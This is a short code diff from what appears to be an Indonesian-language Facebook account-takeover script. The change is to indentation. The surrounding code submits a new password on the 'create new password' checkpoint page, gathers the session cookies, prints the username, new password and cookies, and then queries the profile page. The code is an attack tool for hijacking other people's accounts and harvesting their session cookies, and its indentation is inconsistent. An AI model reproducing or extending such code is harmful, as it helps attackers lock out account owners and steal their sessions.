@@ -647,15 +647,15 @@ class log_hasil(user, pasw):
       if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
         if b in resUbah("input"):
           if b.get("name") in but2:
-          dat2.update({b.get("name"):b.get("value")})
-          dat2.update({"password_new":"".join(pwBaru)})
-          an=session.post(url+link3.get("action"),data=dat2)
-          coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-          print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
-            if "checkpoint" not in coki:
-          get_info(session,coki)
-          cek_apk(session,coki)
-        else:
+            dat2.update({b.get("name"):b.get("value")})
+            dat2.update({"password_new":"".join(pwBaru)})
+            an=session.post(url+link3.get("action"),data=dat2)
+            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+            print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
+          if "checkpoint" not in coki:
+            get_info(session,coki)
+            cek_apk(session,coki)
+          else:
           print("")
   def get_info(session,coki):
 		get_id = session.get("https://mbasic.facebook.com/profile.php",cookie={"cookies":coki}).text
